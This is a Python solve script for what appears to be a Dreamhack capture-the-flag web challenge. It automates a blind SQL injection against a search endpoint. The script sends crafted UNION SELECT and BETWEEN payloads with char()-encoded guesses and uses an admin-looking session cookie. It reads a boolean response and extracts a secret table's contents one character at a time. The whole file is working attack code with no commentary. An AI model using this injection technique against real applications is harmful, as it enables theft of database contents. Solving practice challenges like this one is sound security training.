import requests

URL = "http://host3.dreamhack.games:20763/search"
cookie = "eyJ1c2VyIjoiQURNSU4ifQ.aUItVA.trnM4F2hLOBtLdhiAFhUCAGiL_I"
LOCAL_URL = "http://localhost:5000/search"
local_cookie = "eyJ1c2VyIjoiQURNSU4ifQ.aUIJmA.bUnTlXpl4EqIG7oHIitW8Xkg7sw"
session = requests.Session()


def to_char(s):
    res = f"char({','.join(str(ord(c)) for c in s)})"
    return res

def solve(local=False):
    flag = "B1N4RY{"
    print(f"[*] Starting. Flag: {flag}")
    if local:
        session.cookies.set("session", local_cookie)
        url = LOCAL_URL
    else:
        session.cookies.set("session", cookie)
        url = URL
    for _ in range(64):
        for i in range(32, 127):
            char_to_test = chr(i)
            low = to_char(flag + char_to_test)
            high = to_char(flag + chr(255))
            payload = f"hehe' UNION SELECT 1, 2, 3 WHERE (SELECT * FROM secretgyul) BETWEEN (1, {low}, 0) AND (1, {high}, 10) --"
            
            data = {"name": payload}
            resp = session.post(url, data=data)
            if '"exists":false' in resp.text:
                found_char = chr(i - 1)
                flag += found_char
                print("Current flag: ", flag)
                if found_char == "}":
                    print("\n[*] Flag Found!")
                    return
                break

if __name__ == "__main__":
    solve(True)
    solve()